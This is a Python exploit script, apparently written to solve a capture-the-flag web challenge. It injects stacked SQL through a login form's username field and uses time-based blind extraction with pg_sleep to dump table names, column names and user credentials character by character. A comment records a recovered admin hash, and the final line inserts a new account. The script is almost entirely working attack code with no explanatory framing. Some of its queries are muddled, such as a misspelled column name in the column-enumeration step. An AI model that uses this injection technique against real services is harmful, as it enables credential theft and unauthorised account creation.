import requests
from datetime import datetime
from string import ascii_lowercase, digits, ascii_uppercase

sess = requests.Session()
url = "https://pasteweb.ctf.zoolab.org"
#url = "http://192.168.198.157:8888/"
sess.get(url)

def exec_query(query:str):
    with sess.post(
        url,
        data={
            "username": f"';{query}; --'",
            "password":"",
            "current_time":int(datetime.now().timestamp())
        }
    ) as resp:
        pass

table_name = "pasteweb_accounts"

def get_databasename():
    from string import ascii_lowercase, digits
    dict_char = ascii_lowercase + "_" + digits + "{}" + ","
    idx = 1
    res = ""
    while True:
        times = []
        for c in dict_char:
            st = datetime.now()
            exec_query(f"SELECT case when substr(array_agg(concat(table_name))::text, {idx}, 1)='{c}' then pg_sleep(2) else pg_sleep(0) end FROM information_schema.tables")
            ed = datetime.now()
            times.append((ed - st).seconds)
            if (ed - st).seconds == 2:
                break
        if max(times) == 0:
            break
        guessed_char = dict_char[times.index(max(times))]
        res += guessed_char
        print(f'{guessed_char}: {max(times)}')
        print(res)
        
        idx+=1
    return res

colname = ["user_id","user_account","user_paslword"]

def get_colname():
    from string import ascii_lowercase, digits
    dict_char = ascii_lowercase + "_" + digits + "{}" + ","
    idx = 1
    res = ""
    while True:
        times = []
        for c in dict_char:
            st = datetime.now()
            exec_query(f"SELECT case when substr(array_agg(concat(user_id, ',', user_account, ',', user_paslword))::text, {idx}, 1)='{c}' then pg_sleep(2) else pg_sleep(0) end FROM information_schema.columns WHERE table_name='{table_name}'")
            ed = datetime.now()
            times.append((ed - st).seconds)
            if (ed - st).seconds == 2:
                break
        if max(times) == 0:
            break
        guessed_char = dict_char[times.index(max(times))]
        res += guessed_char
        print(f'{guessed_char}: {max(times)}')
        idx+=1
    return res

def get_data():
    dict_char = ascii_lowercase + "_" + digits + "{}" + "," + '"' + ascii_uppercase
    idx = 1
    res = ""
    while True:
        times = []
        for c in dict_char:
            st = datetime.now()
            exec_query(f"SELECT case when substr(array_agg(concat(user_id, ',', user_account, ',', user_password))::text, {idx}, 1)='{c}' then pg_sleep(2) else pg_sleep(0) end FROM {table_name}")
            ed = datetime.now()
            times.append((ed - st).seconds)
            if (ed - st).seconds == 2:
                break
        if max(times) == 0:
            break
        guessed_char = dict_char[times.index(max(times))]
        res += guessed_char
        print(f'{guessed_char}: {max(times)}')
        print(res)
        idx+=1
    return res
#print(get_data()) # {"1,admin,00ff3da3f03eb731c08c1a34de757574","777,p609
# P@ssw0rD
from hashlib import md5
username = "asef18766_"
exec_query(f"insert into pasteweb_accounts (user_account, user_password) VALUES('{username}','{md5(username.encode()).digest().hex()}')")